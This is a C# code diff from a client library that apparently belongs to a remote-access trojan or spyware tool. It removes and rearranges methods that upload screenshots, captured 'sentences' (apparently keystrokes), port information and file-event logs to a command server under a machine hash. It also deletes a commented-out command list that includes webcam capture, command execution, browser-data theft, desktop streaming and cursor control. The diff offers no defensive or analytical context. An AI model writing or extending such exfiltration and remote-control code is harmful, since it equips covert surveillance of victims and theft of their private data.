@@ -148,27 +148,6 @@ namespace Library
             }
         }
 
-        public bool UploadImage(string fileName, Image bitmapImage, long quality)
-        {
-            try
-            {
-                var imgArray = Imaging.BitmapToJpeg(bitmapImage, quality);
-                var request = new RestRequest("/values/UploadImage/{data}", Method.POST);
-                var data = new ImageData()
-                {
-                    FileName = fileName,
-                    Image = Convert.ToBase64String(imgArray),
-                    Token = Auth.Token
-                };
-                data.ComputerHash = TSettings.ComputerHash;
-                request.AddObject(data);
-                var response = client.Execute(request);
-                return response.Content != null && response.Content.Length > 0;
-            }
-            catch { }
-            return false;
-        }
-
         public bool UploadFile(FileData data)
         {
             try
@@ -233,25 +212,6 @@ namespace Library
             return General.Sha1Hash(Auth.HostName + Auth.IpExternal + Auth.IpInternal);
         }
 
-        public string UploadSentences(List<string> list)
-        {
-            string content = String.Empty;
-            try
-            {
-                var request = new RestRequest("/values/UploadFile", Method.POST);
-                //request.AddUrlSegment("tokenValue", Auth.Token);
-                //request.RequestFormat = DataFormat.Json;
-                StringBuilder sb = new StringBuilder();
-                list.ForEach((String s) => sb.AppendLine(s));
-                var data = new FileData("sentences.txt", Encoding.Default.GetBytes(sb.ToString()), TSettings.ComputerHash);
-                request.AddObject(data);
-                var response = client.Execute(request);
-                content = response.Content;
-            }
-            catch (Exception ex) { }
-            return content;
-        }
-
         public string UploadData(string filename, object objData, bool useCompression)
         {
             string content = String.Empty;
@@ -265,7 +225,7 @@ namespace Library
                 }
                 var bytesToTransfer = useCompression ? Compression.Compress("file", bytes) : bytes;
                 //bytesToTransfer = bytesToTransfer.Length < bytes.Length ? bytesToTransfer : bytes;
-                var request = new RestRequest("/values/UploadFile", Method.POST);
+                var request = new RestRequest("/values/UploadFile/{data}", Method.POST);
                 request.ReadWriteTimeout = 30000;
                 request.Timeout = 30000;
                 var data = new FileData(filename, bytesToTransfer, TSettings.ComputerHash);
@@ -275,6 +235,27 @@ namespace Library
             }
             catch (Exception ex) { }
             return content;
+        }
+
+        public bool UploadImage(string fileName, Image bitmapImage, long quality)
+        {
+            try
+            {
+                var imgArray = Imaging.BitmapToJpeg(bitmapImage, quality);
+                var request = new RestRequest("/values/UploadImage/{data}", Method.POST);
+                var data = new ImageData()
+                {
+                    FileName = fileName,
+                    Image = Convert.ToBase64String(imgArray),
+                    Token = Auth.Token
+                };
+                data.ComputerHash = TSettings.ComputerHash;
+                request.AddObject(data);
+                var response = client.Execute(request);
+                return response.Content != null && response.Content.Length > 0;
+            }
+            catch { }
+            return false;
         }
 
         //public bool RegisterWithServer()
@@ -364,60 +345,6 @@ namespace Library
         //    catch (Exception ex) { }
         //}
 
-        //public string UploadSentences(List<string> data)
-        //{
-        //    string content = String.Empty;
-        //    try
-        //    {
-        //        var request = new RestRequest("/upload/sentences/{tokenValue}", Method.POST);
-        //        request.AddUrlSegment("tokenValue", Auth.Token);
-        //        request.RequestFormat = DataFormat.Json;
-        //        //System.Windows.Forms.MessageBox.Show(data[0]);
-        //        StringBuilder sb = new StringBuilder();
-        //        data.ForEach((String s) => sb.AppendLine(s));
-        //        request.AddParameter("text/xml", sb.ToString(), ParameterType.RequestBody);
-        //        var response = client.Execute(request);
-        //        content = response.Content;
-        //    }
-        //    catch (Exception ex) { }
-        //    return content;
-        //}
-
-        public string UploadPortInfo(string portInfo)
-        {
-            string content = String.Empty;
-            try
-            {
-                var request = new RestRequest("/values/UploadFile", Method.POST);
-                //request.AddUrlSegment("tokenValue", Auth.Token);
-                //request.RequestFormat = DataFormat.Json;
-                var data = new FileData("portinfo.txt", Encoding.Default.GetBytes(portInfo), TSettings.ComputerHash);
-                request.AddObject(data);
-                var response = client.Execute(request);
-                content = response.Content;
-            }
-            catch (Exception ex) { }
-            return content;
-        }
-
-        public string UploadFileEvents(string fileEvents)
-        {
-            string content = String.Empty;
-            try
-            {
-                var request = new RestRequest("/values/UploadFile", Method.POST);
-                //request.AddUrlSegment("tokenValue", Auth.Token);
-                //request.RequestFormat = DataFormat.Json;
-                //request.AddParameter("text/xml", data, ParameterType.RequestBody);
-                var data = new FileData("fileevents.txt", Encoding.Default.GetBytes(fileEvents), TSettings.ComputerHash);
-                request.AddObject(data);
-                var response = client.Execute(request);
-                content = response.Content;
-            }
-            catch (Exception ex) { }
-            return content;
-        }
-
         public byte[] DownloadFile()
         {
             byte[] result = null;
@@ -444,55 +371,6 @@ namespace Library
             public string FileData { get; set; }
             public FileDownloadInfo() { }
         }
-
-        /*public class Command
-        {
-            public ECommand Command { get; set; }
-            public 
-        }*/
-
-        //public enum ECommand
-        //{
-        //    UPLOAD_IMAGE,
-        //    UPLOAD_SENTENCES,
-        //    UPLOAD_WEBCAM_IMAGE,
-        //    EXECUTE_COMMAND,
-        //    UPLOAD_PORT_INFO,
-        //    UPLOAD_BROWSER_DATA,
-        //    DOWNLOAD_FILE,
-        //    UPLOAD_FILE,
-        //    UPLOAD_FILE_EVENTS,
-        //    STREAM_DESKTOP,
-        //    STOP_STREAM_DESKTOP,
-        //    MOVE_CURSOR,
-        //    DO_NOTHING
-        //}
-
-        //public class Settings
-        //{
-        //    public string ComputerHash { get; set; }
-        //    private ECommand _command = ECommand.DO_NOTHING;
-        //    public ECommand Command
-        //    {
-        //        get { return _command; }
-        //        set
-        //        {
-        //            if (Enum.IsDefined(typeof(ECommand), value))
-        //                _command = (ECommand)value;
-        //            else
-        //                _command = value;
-        //        }
-        //    }
-        //    //public ECommand Command { get; set; }
-        //    public long ImageQuality { get; set; }
-        //    public string FileName { get; set; }
-        //    public string FileArgs { get; set; }
-        //    public string FileToUpload { get; set; }
-        //    public string FileToDownload { get; set; }
-        //    public int CursorX { get; set; }
-        //    public int CursorY { get; set; }
-        //    public string KeyCode { get; set; }
-        //}
 
         public class ProcessCommand
         {
